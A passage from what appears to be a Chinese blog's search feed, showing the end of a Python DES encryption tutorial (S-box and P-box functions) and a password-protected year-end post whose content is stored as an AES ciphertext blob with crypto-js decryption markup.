class="keyword">in</span> E:</span><br><span class="line">        res += bin_str[i<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="comment"># Sç›’è¿‡ç¨‹</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">s_box</span><span class="params">(my_str)</span>:</span></span><br><span class="line">    res = <span class="string">""</span></span><br><span class="line">    c = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(my_str),<span class="number">6</span>):</span><br><span class="line">        now_str = my_str[i:i+<span class="number">6</span>]</span><br><span class="line">        row = int(now_str[<span class="number">0</span>]+now_str[<span class="number">5</span>],<span class="number">2</span>)</span><br><span class="line">        col = int(now_str[<span class="number">1</span>:<span class="number">5</span>],<span class="number">2</span>)</span><br><span class="line">        num = bin(S[c][row*<span class="number">16</span> + col])[<span class="number">2</span>:]   <span class="comment">#åˆ©ç”¨äº†binè¾“å‡ºæœ‰å¯èƒ½ä¸æ˜¯4ä½strç±»å‹çš„å€¼ï¼Œæ‰€ä»¥æ‰æœ‰ä¸‹é¢çš„å¾ªç¯å¹¶ä¸”åŠ ä¸Šå­—ç¬¦0</span></span><br><span class="line">        <span class="keyword">for</span> gz <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">4</span>-len(num)):</span><br><span class="line">            num = <span class="string">'0'</span>+ num</span><br><span class="line">        res += num</span><br><span class="line">        c  += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="comment">#Pç›’ç½®æ¢</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">p_box</span><span class="params">(bin_str)</span>:</span></span><br><span class="line">    res = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span>  P:</span><br><span class="line">        res += bin_str[i<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><h3 id="æ­£ç¡®æ€§"><a href="#æ­£ç¡®æ€§" class="headerlink" title="æ­£ç¡®æ€§"></a>æ­£ç¡®æ€§</h3><p>åŠ å¯†è§£å¯†å†…å®¹éƒ½ä¼šæ”¾åˆ°æ–‡ä»¶é‡Œé¢ï¼Œç„¶åé€šè¿‡è¯»å†™æ–‡ä»¶çš„æ–¹å¼å°†å†…å®¹æˆåŠŸåŠ è§£å¯†ï¼Œä»¥â€helloworldâ€ä¸ºä¾‹ï¼Œèƒ½å¤Ÿæ­£ç¡®åŠ è§£å¯†</p><p><img src="https://s2.ax1x.com/2019/01/01/F51J8s.png" alt="F51J8s.png"></p><h3 id="è¯¦ç»†ä»£ç -æ”¾åœ¨githubä¸Šäº†-ï¼šDESåŠ è§£å¯†"><a href="#è¯¦ç»†ä»£ç -æ”¾åœ¨githubä¸Šäº†-ï¼šDESåŠ è§£å¯†" class="headerlink" title="è¯¦ç»†ä»£ç (æ”¾åœ¨githubä¸Šäº†)ï¼šDESåŠ è§£å¯†"></a>è¯¦ç»†ä»£ç (æ”¾åœ¨githubä¸Šäº†)ï¼š<a href="https://github.com/0v3rW4tch/Cryptography-course-design" target="_blank" rel="noopener">DESåŠ è§£å¯†</a></h3>]]></content>
      
      <categories>
          
          <category> å¯†ç å­¦ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å¯†ç å­¦ </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2018å˜…ç¸½çµ</title>
      <link href="/writing-2.html"/>
      <url>/writing-2.html</url>
      <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">è¯·è¾“å…¥å¯†ç </h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none"> 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